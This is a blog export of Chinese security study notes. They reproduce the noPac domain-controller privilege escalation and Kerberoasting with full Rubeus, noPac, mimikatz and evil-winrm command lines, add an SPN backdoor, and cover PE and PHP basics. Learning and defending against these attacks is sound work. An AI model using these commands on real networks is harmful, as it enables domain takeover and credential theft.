<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278分析复现</title>
    <url>/2022/03/01/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>距离漏洞披露已经过了许久，现在终于有些空余时间用于学习复现这两个漏洞。</p>
</blockquote>
<h3 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h3><ul>
<li>CVE-2021-42278，机器账户的名称一般用<code>$</code>结尾，但AD并未对域内机器账户名进行验证。</li>
<li>CVE-2021-42287， 结合上述42278漏洞，创建一个与DC机器账户名称相同的机器账户(不以$结尾)，使用该账户请求一个TGT后，修改账户名，然后通过S4U2Self申请TGS Ticket，然后DC进行在<code>TGS_REP</code>阶段加密<code>TGS Ticket</code>时，无法找到该账户利用机器账户hash加密，DC便使用自己的hash加密<code>TGS Ticket</code>，提供一个属于该账户的<code>PAC</code>，我们便可得到一个高权限的ST。</li>
</ul>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h3><ol>
<li>首先创建一个机器账户</li>
<li>清除机器账户的<code>servicePrincipalName</code>属性</li>
<li>将机器账户的<code>sAMAccountName</code>修改为DC的机器账户名，但不带$</li>
<li>使用机器账户的身份请求TGT</li>
<li>将机器账户的<code>sAMAccountName</code>修改为其他值，不能与DC的机器账户名重复。</li>
<li>通过S4U2Self向KDC申请ST</li>
<li>拿到高权限ST票据，完成利用。</li>
</ol>
<p>利用原理：如果域内存在一台域控名为DC(机器账户为DC$)的域控机，此时攻击者可利用CVE-2021-42287漏洞去申请一个机器账户，再将机器账户的<code>sAMAccountName</code>修改为DC。然后再利用这个机器账户去申请一个TGT票据，再将DC的<code>sAMAccountName</code>修改为其他。修改结束后再利用这个TGT通过S4U2Self去申请ST票据，此时KDC识别TGT票据内用户名为DC，检索到域内并未存在DC用户，但存在DC$用户(检索的依据为sAMAccountName值)，于是KDC通过DC机器的hash加密票据，我们便可成功拿到DC的权限。</p>
<span id="more"></span>

<h3 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h3><h4 id="手动实现"><a href="#手动实现" class="headerlink" title="手动实现"></a>手动实现</h4><h5 id="1-创建机器账户"><a href="#1-创建机器账户" class="headerlink" title="1.创建机器账户"></a>1.创建机器账户</h5><p>拿到域成员权限后，利用Powermad.ps1创建机器用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module Poweremad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount Nayon</span><br></pre></td></tr></table></figure>

<p>验证是否添加成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302184058328.png" alt="image-20220302184058328"></p>
<h5 id="2-擦除SPN记录信息"><a href="#2-擦除SPN记录信息" class="headerlink" title="2.擦除SPN记录信息"></a>2.擦除SPN记录信息</h5><p>注册机器账户后，会自动在<code>Nayon$</code>的名下注册SPN服务，此时我们需要擦除，免于影响我们接下来的操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainObject &quot;CN=Nayon,CN=Computers,DC=attack&quot;,DC=&quot;local&quot; #查看Nayon$用户下的信息</span><br><span class="line">Set-DomainObject &quot;CN=Nayon,CN=Computers,DC=attack,DC=local&quot; -Clear &#x27;serviceprincipalname&#x27; -Verbose #擦除SPN服务</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302224406626.png" alt="image-20220302224406626"></p>
<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302224910302.png" alt="image-20220302224910302"></p>
<p>此时已将记录清除。</p>
<h5 id="3-修改samaccountname伪造机器账户名"><a href="#3-修改samaccountname伪造机器账户名" class="headerlink" title="3.修改samaccountname伪造机器账户名"></a>3.修改<code>samaccountname</code>伪造机器账户名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount 机器账户名 -Value &quot;要伪造的机器账户名(无$)&quot; -Attribute</span><br><span class="line">samaccountname -Verbose</span><br><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302225727545.png" alt="image-20220302225727545"></p>
<p>此时可以看到，我们的<code>Nayon$</code>用户，在修改了<code>samaccountname</code>值后，用户名已改为<code>DC</code>。</p>
<h5 id="4-申请TGT票据"><a href="#4-申请TGT票据" class="headerlink" title="4.申请TGT票据"></a>4.申请TGT票据</h5><p>由于知道机器账户的明文密码，我们可以直接使用Rubeus申请TGT票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:DC /password:******* /domain:attack.local /dc:attack.local /nowrap</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注: nowrap 选项，票据不换行，便于我们导出为文件</p>
</blockquote>
<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302231105438.png" alt="image-20220302231105438"></p>
<h5 id="5-再次修改samaccountname值"><a href="#5-再次修改samaccountname值" class="headerlink" title="5.再次修改samaccountname值"></a>5.再次修改<code>samaccountname</code>值</h5><p>将拿到的票据保存，并继续修改<code>Nayon$</code>用户的<code>samaccountname</code>，使其不为DC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount Nayon -Value &quot;Nayon&quot; -Attribute</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302231452272.png" alt="image-20220302231452272"></p>
<h5 id="6-借用DC用户的TGT去DC-的ST票据"><a href="#6-借用DC用户的TGT去DC-的ST票据" class="headerlink" title="6.借用DC用户的TGT去DC$的ST票据"></a>6.借用DC用户的TGT去DC$的ST票据</h5><p>利用Rubeus实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot;</span><br><span class="line">/altservice:&quot;cifs/dc.attack.local&quot; /dc:&quot;dc.attack.local&quot; /ptt</span><br><span class="line">/ticket:xxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302233836680.png" alt="image-20220302233836680"></p>
<p>此时已拥有访问dc的共享目录权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220302234949690.png" alt="image-20220302234949690"></p>
<h4 id="自动化实现"><a href="#自动化实现" class="headerlink" title="自动化实现"></a>自动化实现</h4><p>使用noPac项目实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/cube0x0/noPac</span><br></pre></td></tr></table></figure>

<p>项目下载地址，需本地自行编译。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./noPac.exe -domain attack.local -user Webmanager -pass &#x27;Password@1!&#x27; /dc dc.attack.local</span><br><span class="line">/mAccount test /mPassword test0123 /service cifs /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220303123150880.png" alt="image-20220303123150880"></p>
<h3 id="Psexec方式直接Getshell"><a href="#Psexec方式直接Getshell" class="headerlink" title="Psexec方式直接Getshell"></a>Psexec方式直接Getshell</h3><p>若要通过此方式获得shell，在前一步仅获得<code>cifs</code>服务的权限还不够，我们还需要申请拿到host服务的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\dc.attack.local cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220303123319064.png" alt="image-20220303123319064"></p>
<h3 id="Dcsync拖取域内所有hash"><a href="#Dcsync拖取域内所有hash" class="headerlink" title="Dcsync拖取域内所有hash"></a>Dcsync拖取域内所有hash</h3><p>想要拖取域内hash，我们可以利用漏洞申请<code>ldap</code>服务的ST票据，PTT加载后，通过mimikatz申请</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./noPac.exe -domain attack.local -user Webmanager -pass &#x27;Password@1!&#x27; /dc dc.attack.local /mAccount test /mPassword test0123 /service ldap /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220303124511355.png" alt="image-20220303124511355"></p>
<p>拿到hash后利用<code>Evil-Winrm</code>登陆域控<code>getshell</code>，当然，此处也可使用<code>impacket</code>套件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.165 -u Administrator -H &quot;dbf36575210cc5a38ab4050cc6a2e9aa&quot; </span><br></pre></td></tr></table></figure>



<p><img src="/images/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0.assets/image-20220303125032356.png" alt="image-20220303125032356"></p>
<h3 id="关于漏洞修复"><a href="#关于漏洞修复" class="headerlink" title="关于漏洞修复"></a>关于漏洞修复</h3><ul>
<li>安装微软官方的:KB5008602、KB5008380补丁。</li>
<li>通过ADSI编辑器将AD域的MAQ配置为0，中断漏洞的利用链。</li>
</ul>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-DOS头</title>
    <url>/2021/11/19/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4/</url>
    <content><![CDATA[<p>PE结构-DOS头，本部分为参照吾爱破解论坛lyl610abc师傅<a href="https://www.52pojie.cn/thread-1403011-1-1.html">PE文件笔记</a>所整理的学习笔记。</p>
<h3 id="DOS部首"><a href="#DOS部首" class="headerlink" title="DOS部首"></a>DOS部首</h3><h4 id="DOS部首结构"><a href="#DOS部首结构" class="headerlink" title="DOS部首结构"></a>DOS部首结构</h4><span id="more"></span>

<p><strong>其结构分为两部分:</strong></p>
<ol>
<li><strong>DOS ‘MZ’ HEADER</strong> 其在c中定义的结构体为_IMAGE_DOS_HEADER</li>
<li>DOS sub </li>
</ol>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119195942676.png" alt="image-20211119195942676"></p>
<h5 id="DOS-MZ头"><a href="#DOS-MZ头" class="headerlink" title="DOS MZ头"></a>DOS MZ头</h5><p>DOS MZ头在C语言中所定义的结构体为:</p>
<p>定义于<strong>winnt.h</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="分析-IMAGE-DOS-HEADER成员"><a href="#分析-IMAGE-DOS-HEADER成员" class="headerlink" title="分析_IMAGE_DOS_HEADER成员"></a>分析<code>_IMAGE_DOS_HEADER</code>成员</h4><p>DOS部首的存在，是为了往下兼容在低版本DOS系统上运行，所以该部分主要用于DOS系统</p>
<p>目前在32/64位Windows操作系统中还有效的成员只有两个</p>
<ul>
<li>第一个成员:e_magic (WORD 2字节) 用于识别文件是否为PE格式文件 值固定为<strong>4d 5a (MZ)</strong></li>
<li>最后一个成员: e_lfanew (LONG 4字节)  存储PE头首地址 位于0x3c位置</li>
</ul>
<p>DOS部首中的其他值已经在现阶段Windows系统中弃用，下面通过将对应值置换为0，验证其无效性：</p>
<p>利用16进制编辑器打开Everedit.exe程序，将DOS部首除<strong>e_magic</strong>、<code>e_lfanew</code>之外的DOS部首成员选中清零</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119201606255.png" alt="image-20211119201606255"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4.assets/image-20211119201720010.png" alt="image-20211119201720010"></p>
<p>另存为新文件后仍能正常使用，确认DOS部首其他值已在Windows平台弃用。</p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberoasting</title>
    <url>/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>​    <strong>Kerberoasting的概念</strong></p>
<p>​    <strong>Kerberoasting的原理</strong></p>
<p>​    <strong>Kerberoasting的实现</strong></p>
<p>​    <strong>Kerberoasting后门利用</strong></p>
<span id="more"></span>

<h2 id="0x02-基本概念"><a href="#0x02-基本概念" class="headerlink" title="0x02 基本概念"></a>0x02 基本概念</h2><h3 id="一、SPN是什么"><a href="#一、SPN是什么" class="headerlink" title="一、SPN是什么:"></a>一、<strong>SPN是什么:</strong></h3><p>服务主题名称( SPN: Service Principal Names) 是服务实例， 可以将其理解为一个服务（比如HTTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。</p>
<p>如果在整个域或林中的计算机上安装多个服务实例，则每个实例都必须有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN始终包含运行服务实例主机的名称，因此服务实例可以为其主机名称或别名注册SPN。如果想使用<strong>Kerberos</strong>协议进行认证服务，那必须正确配置SPN</p>
<h3 id="SPN分类"><a href="#SPN分类" class="headerlink" title="SPN分类:"></a><strong>SPN分类:</strong></h3><p><strong>1.注册在域内机器账户(computer)下</strong></p>
<p>当一个服务的权限为Local System 或 Network Service时，SPN会注册于域内机器账户下(Computers)</p>
<p><strong>注册在域内用户账户(User)下</strong></p>
<p>当一个服务的权限为一个域用户，则此时SPN注册在域用户账户下(Users)</p>
<h3 id="二、SPN标准格式"><a href="#二、SPN标准格式" class="headerlink" title="二、SPN标准格式"></a><strong>二、SPN标准格式</strong></h3><p>在 SPN 的语法中存在四种元素，两个必须元素和两个额外元素，其中和为必须元素:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;service class&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt; accountname</span><br><span class="line">&lt;service class&gt; 	#标识服务类的字符串</span><br><span class="line">&lt;host&gt;	#服务所在主机名</span><br><span class="line">&lt;port&gt;	#服务端口</span><br><span class="line">&lt;service name&gt;	#服务名称</span><br><span class="line">accountname #注册账户名</span><br></pre></td></tr></table></figure>

<p>Serviceclass可以认为是服务名，常见的有www,ldap,http,dns等</p>
<p>host有两种形式，FQDN与NetBIOS名，例如Service1.redteam.com和service1</p>
<p>如果服务运行于默认端口上，可省略端口号</p>
<h3 id="三、查询SPN"><a href="#三、查询SPN" class="headerlink" title="三、查询SPN"></a>三、查询SPN</h3><p>利用setspn等手段对域控制器发起LDAP查询，是正常的Kerberos票据行为的一部分，因此很难被设备或筛选日志查询得到。</p>
<p><strong>1.使用SetSPN</strong></p>
<p>查看当前域内所有的SPN:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -q */*</span><br></pre></td></tr></table></figure>

<p>查看目标域内的SPN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -t redteam -q */*</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927155830466.png" alt="image-20210927155830466"></p>
<p>可以发现</p>
<p><strong>机器账户：</strong></p>
<ul>
<li><strong>CN=AD-2016,OU=Domain Controllers,DC=redteam,DC=com</strong></li>
<li><strong>CN=AD2-2016,OU=Domain Controllers,DC=redteam,DC=com</strong></li>
<li><strong>CN=WEB-2012,CN=Computers,DC=redteam,DC=com</strong></li>
<li><strong>CN=WEB-2003,CN=Computers,DC=redteam,DC=com</strong></li>
</ul>
<p><strong>域用户账户：</strong></p>
<ul>
<li><strong>CN=krbtgt,CN=Users,DC=redteam,DC=com</strong></li>
</ul>
<p><strong>注册于域用户下的SPN仅有一个：</strong></p>
<ul>
<li><strong>kadmin/changepw</strong></li>
</ul>
<h2 id="0x03-Kerberoasting的原理"><a href="#0x03-Kerberoasting的原理" class="headerlink" title="0x03 Kerberoasting的原理"></a>0x03 Kerberoasting的原理</h2><h3 id="一、-Kerberos认证过程"><a href="#一、-Kerberos认证过程" class="headerlink" title="一、 Kerberos认证过程"></a>一、 Kerberos认证过程</h3><ul>
<li>​    Kerberoasting 当域内某个用户去请求同域内的某个服务实例时，请求会首先被 送达至<strong>KDS</strong> 的 <strong>AS</strong> 中进行身份认证。</li>
<li>​    通过后 <strong>AS</strong> 会返回一个由用户密码<strong>hash</strong>加密而成的<strong>TGT</strong>票据给用户，然后用户再拿着<strong>TGT</strong>票据去请求<strong>TGS</strong>，<strong>TGS</strong>验证成功后会返回一个用对应服务账号的密码<strong>hash</strong>加密过**(RC4_HMAC_MD5)<strong>的票据</strong>TGS**</li>
<li>​    用户拿着<strong>TGS</strong>通过目标服务实例验证后可以去访问对应的服务资源，<strong>Kerberoasting</strong>攻击利用TGS票据加密算法已知这一条件，尝试穷举口令，对<strong>TGS</strong>进行对比，若<strong>TGS</strong>相同，则口令正确。得到对应服务实例的明文密码。</li>
</ul>
<h3 id="二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><a href="#二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系" class="headerlink" title="二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"></a>二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</h3><p>设用户a需要访问Mysql服务，进行到**Ticket Granting Server(TGS)**返还TGS票据时：</p>
<p><strong>1.Domain Controller查询Mysql服务的SPN</strong></p>
<p>如果该SPN注册在机器账户(<strong>Computers</strong>)，将会查询所有机器账户(<strong>Computers</strong>)的servicePrincipalName属性，查找对应的账户</p>
<p>如果该SPN注册在域用户账户(<strong>Users</strong>)，将会查询所有域用户账户(<strong>Users</strong>)的servicePrincipalName属性，查找对应的账户</p>
<p>**2.**找到对应的账户后，使用该账户的NTLM Hash，生成TGS票据</p>
<p><strong>3、域内的主机都能查询SPN</strong></p>
<p><strong>4、域内的任何用户都可以向域内的任何服务请求TGS</strong></p>
<p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解。</p>
<p>对于破解的明文口令，只有域用户账户(Users)的口令存在价值，不必考虑机器账户的口令(无法用于远程连接)</p>
<p>利用思路如下：</p>
<ol>
<li>查询SPN，找到有价值的SPN，需要满足如下条件    <ul>
<li>SPN注册在域用户账户下(Users)</li>
<li>域用户账户的权限很高</li>
</ul>
</li>
<li>请求TGS</li>
<li>导出TGS</li>
<li>利用字典破解TGS拿到明文密码</li>
</ol>
<h2 id="0x04-Kerberoasting的实现方法一"><a href="#0x04-Kerberoasting的实现方法一" class="headerlink" title="0x04 Kerberoasting的实现方法一"></a>0x04 Kerberoasting的实现方法一</h2><h3 id="1、拿到有价值的SPN"><a href="#1、拿到有价值的SPN" class="headerlink" title="1、拿到有价值的SPN"></a><strong>1、拿到有价值的SPN</strong></h3><ul>
<li>注册于域用户账户(Users)下</li>
<li>域用户账户的权限很高</li>
</ul>
<p>1.<strong>使用Powershell模块Active Directory</strong></p>
<p>Actice Directory模块 需要提前安装，域控自带</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
<p>dll文件可在github上自行下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>

<p><strong>2.使用Powerview</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module Powerview.ps1</span><br><span class="line">Get-NetUser -spn -admincount | select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927164313999.png" alt="image-20210927164313999"></p>
<p><strong>3.利用Kerberoast</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>

<p>列出所有域用户SPN</p>
<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927165832743.png" alt="image-20210927165832743"></p>
<h3 id="3、请求TGS票据"><a href="#3、请求TGS票据" class="headerlink" title="3、请求TGS票据"></a>3、请求TGS票据</h3><p><strong>1、请求指定TGS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SPNName=&#x27;kadmin/changepw&#x27;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>

<p><strong>2、请求所有TGS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | Select-String &#x27;^CN&#x27; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927170102406.png" alt="image-20210927170102406"></p>
<p>klist 查看内存中的票据，即可找到TGS</p>
<p><strong>3、导出</strong></p>
<p>使用mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>

<p>利用hashcat或kerberoast进行破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py 项目地址</span><br><span class="line">python2 tgsrepcrack.py password.txt  1-40a10000-administrator@kadmin~changepw-REDTEAM.COM.kirbi</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Kerberoasting后门利用"><a href="#0x06-Kerberoasting后门利用" class="headerlink" title="0x06 Kerberoasting后门利用"></a>0x06 Kerberoasting后门利用</h2><p>当我们取得SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
<p>例如为域用户<strong>administrator</strong>添加SPN NC/dc.de1ay.com</p>
<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210928100158925.png" alt="image-20210928100158925"></p>
<p>此时为域内用户administrator添加了一个SPN，在域内任何一台主机上都可以获得本SPN，并能使用Kerberoast获得TGS</p>
<p>在后续需要使用时请求服务，获取TGS使用Hashcat破解即可</p>
<p>Ps:写这玩意犯困，困了我好多次呢= =</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计学习-1</title>
    <url>/2021/10/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-1/</url>
    <content><![CDATA[<h4 id="审计时可能会涉及到的超全局变量"><a href="#审计时可能会涉及到的超全局变量" class="headerlink" title="审计时可能会涉及到的超全局变量"></a>审计时可能会涉及到的超全局变量</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$_REQUEST</span>;</span><br><span class="line"><span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$_ENV</span>;</span><br><span class="line"><span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$_SESSION</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="各个变量作用说明"><a href="#各个变量作用说明" class="headerlink" title="各个变量作用说明"></a>各个变量作用说明</h4><p>(1) $GLOBALS 引用全局作用域中可用的全部变量</p>
<p>在一个php脚本的全部作用域全都可以访问到，$GLOBALS是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<p>(2) $_SERVER</p>
<p>是一个包含了诸如头信息（header）、路径(path)、以及脚本位置(script locations) 等等信息的数组。这个数组中的项目由web服务器创建。不能保证每个服务器都会提供给我们完整的信息；服务器可能会忽略一些，也可能会提供一些没有列举在此处的信息给我们。</p>
<p>以下列出了所有$_SERVER变量中的重要元素：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] <span class="comment">#当前正在执行 脚本的文件名，与 document root相关。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>] <span class="comment">#传递给该 脚本的参数。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argc&#x27;</span>] <span class="comment">#包含传递给程序的 命令行参数的个数（如果运行在命令行模式）。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>] <span class="comment">#服务器使用的 CGI 规范的版本。例如，“CGI/1.1”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] <span class="comment">#当前 运行脚本所在服务器 主机的名称。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>] <span class="comment">#服务器标识的字串，在响应请求时的头部中给出。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>] <span class="comment">#请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] <span class="comment">#访问页面时的请求方法。例如：“GET”、“HEAD”，“POST”，“PUT”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] <span class="comment">#查询(query)的字符串。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>] <span class="comment">#当前 运行脚本所在的文档根目录。在服务器配置文件中定义。</span></span><br><span class="line"> </span><br><span class="line"><span 